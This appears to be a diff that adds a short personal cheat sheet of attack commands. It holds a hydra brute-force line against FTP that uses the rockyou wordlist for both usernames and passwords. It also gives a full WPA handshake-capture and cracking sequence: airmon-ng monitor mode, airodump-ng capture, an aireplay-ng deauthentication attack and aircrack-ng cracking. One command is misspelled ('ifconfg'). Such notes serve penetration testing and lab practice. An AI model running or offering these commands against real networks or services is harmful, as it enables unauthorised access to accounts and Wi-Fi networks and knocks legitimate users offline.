@@ -1,0 +1,17 @@
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 ftp
+
+---------------------------------
+
+ifconfg wlan0 down
+
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng --bssid <BSSID> -c 6 -w capture wlan0      //continue this till get handshake
+
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
+
+sudo aircrack-ng -w word_list.txt -b <BSSID> capture-01.cap
